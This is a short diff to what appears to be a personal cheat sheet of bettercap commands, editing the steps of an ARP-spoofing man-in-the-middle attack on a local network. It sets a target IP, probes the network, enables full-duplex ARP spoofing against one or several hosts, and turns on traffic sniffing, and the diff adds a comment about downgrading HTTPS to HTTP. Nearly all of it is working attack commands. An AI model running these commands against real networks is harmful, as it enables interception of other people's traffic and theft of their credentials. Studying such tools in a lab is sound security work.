@@ -77,8 +77,10 @@ traget=192.168.20.130 "Target station
 bettercap
 net.probe on
 set arp.spoof fullduplex true $target
-"set arp.spoof fullduplex true $target1, $target2, $target3 ...
+"set arp.spoof fullduplex true $target1, $target2, $target3 ..."
 arp.spoof on
+"For downgrade HTTPS to HTTP"
+set net.sniff.local true
 net.sniff on
 
 
